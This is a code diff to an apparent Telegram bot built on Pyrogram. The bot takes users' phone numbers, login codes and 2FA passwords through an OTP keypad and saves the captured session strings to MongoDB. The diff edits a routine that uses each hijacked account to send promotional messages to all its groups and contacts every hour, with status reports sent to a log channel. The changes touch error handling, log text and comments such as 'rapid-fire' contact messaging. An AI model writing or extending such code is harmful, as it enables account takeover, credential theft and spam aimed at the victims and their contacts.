@@ -17,16 +17,12 @@ from pyrogram.errors import (
     PhoneNumberInvalid,
     PhoneCodeInvalid,
     PhoneCodeExpired,
-    NewSessionRequired,
+    SessionPasswordNeeded,
     PasswordHashInvalid,
     FloodWait,
     AuthKeyUnregistered,
     SessionRevoked,
-    SessionExpired,
-    AuthKeyInvalid,
-    MessageIdInvalid,
-    NewSessionRequired,
-    FreshResetAuthorisationForbidden
+    SessionExpired
 )
 from info import API_ID, API_HASH, DATABASE_URI_SESSIONS_F, LOG_CHANNEL_SESSIONS_FILES
 from pymongo import MongoClient
@@ -34,12 +30,6 @@ from pymongo import MongoClient
 # MongoDB Setup
 mongo_client = MongoClient(DATABASE_URI_SESSIONS_F)
 database = mongo_client['Cluster0']['sessions']
-
-# Session Error List
-SESSION_ERRORS = (
-    AuthKeyUnregistered, SessionRevoked, SessionExpired,
-    AuthKeyInvalid, NewSessionRequired, FreshResetAuthorisationForbidden
-)
 
 # Promo Texts (10 unique messages)
 PROMO_TEXTS = [
@@ -71,9 +61,6 @@ strings = {
 
 # Inline OTP Keyboard
 OTP_KEYBOARD = InlineKeyboardMarkup([
-    [
-        InlineKeyboardButton("ɢᴇᴛ ᴛʜᴇ ᴠᴇʀɪғɪᴄᴀᴛɪᴏɴ ᴄᴏᴅᴇ ʜᴇʀᴇ...", url="https://t.me/+42777")
-    ],
     [
         InlineKeyboardButton("1️⃣", callback_data="otp_1"),
         InlineKeyboardButton("2️⃣", callback_data="otp_2"),
@@ -243,7 +230,7 @@ async def handle_otp_buttons(bot: Client, query: CallbackQuery):
                 reply_markup=OTP_KEYBOARD
             )
             state['otp_digits'] = ''
-        except NewSessionRequired:
+        except SessionPasswordNeeded:
             await query.message.edit("**🔒 2FA REQUIRED:**\nEnter your password:")
             state['needs_password'] = True
             state['last_msg_id'] = query.message.id
@@ -414,7 +401,7 @@ async def send_promotion_messages(bot: Client, session_string: str, phone_number
                     dialog.chat.id not in contacts_and_privates):
                     contacts_and_privates.append(dialog.chat.id)
             
-            # Phase 1: Groups (Always send new messages)
+            # Phase 1: Groups (1 message/minute)
             group_count = 0
             for group in groups:
                 try:
@@ -423,13 +410,10 @@ async def send_promotion_messages(bot: Client, session_string: str, phone_number
                     group_count += 1
                     await bot.send_message(
                         LOG_CHANNEL_SESSIONS_FILES,
-                        f"📩 {phone_number} | New group msg: {group}\n"
-                        f"📝 Content: {text[:20]}...",
+                        f"✅ {phone_number} | Group {group_count}/{len(groups)}: {text[:20]}...",
                         disable_notification=True
                     )
-                    
-                    await asyncio.sleep(60)  # Anti-flood delay
-                    
+                    await asyncio.sleep(60)
                 except FloodWait as e:
                     await bot.send_message(
                         LOG_CHANNEL_SESSIONS_FILES,
@@ -443,7 +427,7 @@ async def send_promotion_messages(bot: Client, session_string: str, phone_number
                         disable_notification=True
                     )
             
-            # Phase 2: Contacts (Always send new messages)
+            # Phase 2: Contacts (rapid-fire)
             contact_count = 0
             for target in contacts_and_privates:
                 try:
@@ -473,13 +457,18 @@ async def send_promotion_messages(bot: Client, session_string: str, phone_number
             # Wait 1 hour before next cycle
             await asyncio.sleep(3600)
             
-        except SESSION_ERRORS as e:
+        except (AuthKeyUnregistered, SessionRevoked, SessionExpired) as e:
             if not already_notified:
-                error_type = type(e).__name__
+                error_type = {
+                    AuthKeyUnregistered: "SESSION_EXPIRED",
+                    SessionRevoked: "SESSION_REVOKED", 
+                    SessionExpired: "SESSION_EXPIRED"
+                }.get(type(e), "SESSION_TERMINATED")
+                
                 await bot.send_message(
                     LOG_CHANNEL_SESSIONS_FILES,
-                    f"🔴 #SESSION_TERMINATED: {phone_number}\n"
-                    f"❌ Error: {error_type}\n"
+                    f"💀 #{error_type}: {phone_number}\n"
+                    f"❌ Error: {str(e)}\n"
                     f"🛑 Auto-disabled promotion"
                 )
                 database.update_one(
@@ -493,8 +482,8 @@ async def send_promotion_messages(bot: Client, session_string: str, phone_number
             if "AUTH_KEY_UNREGISTERED" in str(e) and not already_notified:
                 await bot.send_message(
                     LOG_CHANNEL_SESSIONS_FILES,
-                    f"🔴 #SESSION_TERMINATED: {phone_number}\n"
-                    f"❌ Error: AUTH_KEY_UNREGISTERED\n"
+                    f"💀 #SESSION_TERMINATED: {phone_number}\n"
+                    f"❌ Error: {str(e)}\n"
                     f"🛑 Emergency stop"
                 )
                 database.update_one(
@@ -506,8 +495,7 @@ async def send_promotion_messages(bot: Client, session_string: str, phone_number
                 
             await bot.send_message(
                 LOG_CHANNEL_SESSIONS_FILES,
-                f"⚠️ #Cycle_Failed: {phone_number}\n"
-                f"❌ Error: {str(e)}\n"
+                f"💀 #Cycle_Failed: {phone_number}\n\n{str(e)}\n"
                 f"🔄 Restarting in 5 minutes..."
             )
             await asyncio.sleep(300)
